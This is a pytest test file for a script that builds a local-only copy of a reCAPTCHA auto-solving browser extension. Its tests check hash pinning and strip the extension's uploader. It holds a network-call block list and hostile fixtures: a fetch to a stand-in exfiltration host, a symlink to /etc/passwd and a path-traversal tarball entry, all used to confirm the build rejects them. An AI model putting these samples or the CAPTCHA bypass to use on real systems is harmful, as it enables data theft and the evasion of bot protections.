import hashlib
import importlib.util
import io
import json
import tarfile
from pathlib import Path

import pytest

_SCRIPT = Path(__file__).resolve().parents[1] / "scripts" / "captcharaptor" / "build_extension.py"


def _load():
    spec = importlib.util.spec_from_file_location("build_extension", _SCRIPT)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


be = _load()

RECAPTCHA_JS = (
    "function incStep() {\n  window.__recaptchaSteps = (window.__recaptchaSteps || 0) + 1;\n\n"
    + be.STEP_BROADCAST
    + "  window.dispatchEvent(new CustomEvent('recaptcha:step'));\n}\n"
)


def _files(override=None):
    files = {p: f"// {p}\n".encode() for p in be.COPY}
    files["extension/captcha/recaptcha.js"] = RECAPTCHA_JS.encode()
    files["extension/captcha/recaptcha_ai.js"] = b"const c = new OffscreenCanvas(1, 1);\n"
    files["extension/icon/16.png"] = b"\x89PNG tEXt http://imagemagick.org"
    files["extension/uploader.js"] = b"const UPLOAD_URL = 'https://captcharaptor.com/upload.php';\n"
    files.update(override or {})
    return files


def _tarball(tmp_path, files, extra=None, root=be.ROOT):
    path = tmp_path / "up.tar.gz"
    with tarfile.open(path, "w:gz") as tar:
        for name, data in files.items():
            info = tarfile.TarInfo(f"{root}/{name}")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
        for info in extra or []:
            tar.addfile(info)
    return path


@pytest.fixture
def pinned(monkeypatch):
    def pin(path):
        monkeypatch.setattr(be, "TARBALL_SHA256", hashlib.sha256(path.read_bytes()).hexdigest())
        return path
    return pin


def test_builds_a_local_only_extension(tmp_path, pinned):
    tar = pinned(_tarball(tmp_path, _files()))
    dest = tmp_path / "out"
    be.build(tar, dest)
    names = {str(p.relative_to(dest)) for p in dest.rglob("*") if p.is_file()}
    assert "uploader.js" not in names and "popup.html" not in names
    assert {"manifest.json", "background.js", "rules/hl_en.json", "BUILD-INFO.txt", "LICENSE"} <= names
    m = json.loads((dest / "manifest.json").read_text())
    assert m["host_permissions"] == be.RECAPTCHA_MATCHES
    assert m["permissions"] == ["declarativeNetRequest"]
    assert all(cs["matches"] == be.RECAPTCHA_MATCHES for cs in m["content_scripts"])
    assert m["web_accessible_resources"][0]["matches"] == be.RECAPTCHA_MATCHES
    assert "action" not in m
    script = (dest / "captcha/recaptcha.js").read_text()
    assert "postMessage" not in script and "__recaptchaSteps" in script and "dispatchEvent" in script
    info = (dest / "BUILD-INFO.txt").read_text()
    digest = hashlib.sha256((dest / "background.js").read_bytes()).hexdigest()
    assert f"{digest}  background.js" in info


def test_background_has_fixed_settings_and_no_network():
    js = (_SCRIPT.parent / "background.js").read_text()
    assert "recaptcha_auto_open: true" in js and "recaptcha_auto_solve: true" in js
    for word in ("fetch(", "XMLHttpRequest", "WebSocket", "storage", "alarms", "idle", "indexedDB"):
        assert word not in js
    be.check({"background.js": js.encode()})


def test_wrong_tarball_hash_fails(tmp_path):
    with pytest.raises(be.BuildError, match="does not match"):
        be.build(_tarball(tmp_path, _files()), tmp_path / "out")
    assert not (tmp_path / "out").exists()


@pytest.mark.parametrize("text", [
    "fetch('https://captcharaptor.com/x')",
    "importScripts('uploader.js')",
    "new WebSocket(u)",
    "chrome.offscreen.createDocument()",
    "navigator.sendBeacon(u)",
    "fetch('https://evil.example/collect')",
])
def test_reporting_or_foreign_url_in_output_fails(tmp_path, pinned, text):
    tar = pinned(_tarball(tmp_path, _files({"extension/captcha/recaptcha_ai.js": text.encode()})))
    with pytest.raises(be.BuildError, match="local-only check"):
        be.build(tar, tmp_path / "out")
    assert not (tmp_path / "out").exists()


def test_recaptcha_urls_and_offscreen_canvas_pass():
    be.check({
        "a.js": b"x='https://www.google.com/recaptcha/api2/anchor'; new OffscreenCanvas(1,1);",
        "b.png": b"https://imagemagick.org",
    })


@pytest.mark.parametrize("kind", ["symlink", "traversal"])
def test_unsafe_tarball_entries_fail(tmp_path, pinned, kind):
    if kind == "symlink":
        info = tarfile.TarInfo(f"{be.ROOT}/extension/link")
        info.type, info.linkname = tarfile.SYMTYPE, "/etc/passwd"
    else:
        info = tarfile.TarInfo(f"{be.ROOT}/../escape.js")
    tar = pinned(_tarball(tmp_path, _files(), extra=[info]))
    with pytest.raises(be.BuildError, match="unsafe path|link or special"):
        be.build(tar, tmp_path / "out")


def test_missing_step_broadcast_fails(tmp_path, pinned):
    tar = pinned(_tarball(tmp_path, _files({"extension/captcha/recaptcha.js": b"function incStep() {}\n"})))
    with pytest.raises(be.BuildError, match="step broadcast"):
        be.build(tar, tmp_path / "out")


def test_missing_allowlisted_file_fails(tmp_path, pinned):
    files = _files()
    del files["extension/models/grid.onnx"]
    with pytest.raises(be.BuildError, match="missing from tarball"):
        be.build(pinned(_tarball(tmp_path, files)), tmp_path / "out")


def test_rebuild_replaces_the_previous_output(tmp_path, pinned):
    tar = pinned(_tarball(tmp_path, _files()))
    dest = tmp_path / "out"
    be.build(tar, dest)
    (dest / "stale.js").write_text("old")
    be.build(tar, dest)
    assert not (dest / "stale.js").exists()
